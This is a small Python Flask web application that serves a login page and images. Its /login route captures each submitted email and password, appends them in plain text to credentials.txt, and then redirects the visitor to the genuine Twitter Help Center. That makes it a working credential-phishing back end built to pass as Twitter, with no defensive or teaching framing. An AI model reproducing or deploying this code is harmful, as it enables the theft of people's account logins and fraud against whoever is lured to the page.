from flask import Flask, render_template, send_from_directory, request, redirect, abort
import os  # Add this line


app = Flask(__name__)


# Home route
@app.route('/')
def index():
    current_dir = os.path.abspath(os.path.dirname(__file__))
    return send_from_directory(current_dir, 'index.html')

# Image route
@app.route('/images/<path:filename>')
def serve_image(filename):
    current_dir = os.path.abspath(os.path.dirname(__file__))
    images_folder = os.path.join(current_dir, 'images')
    image_path = os.path.join(images_folder, filename)
    if os.path.exists(image_path) and os.path.isfile(image_path):
        return send_from_directory(images_folder, filename)
    return abort(404)


@app.route('/login', methods=['POST'])
def login():
    # Check if the email and password are provided in the form
    if 'email' in request.form and 'password' in request.form:
        email = request.form['email']
        password = request.form['password']

        # Save credentials to a file (like in your PHP code)
        data = f"Email: {email}\nPassword: {password}\n\n"
        with open('credentials.txt', 'a') as f:
            f.write(data)

        # Redirect to the Twitter Help Center after form submission
        return redirect("https://help.twitter.com/")

    return "Invalid form submission."

if __name__ == '__main__':
    # Run the app on port 8080
    app.run(debug=True, port=8081)   



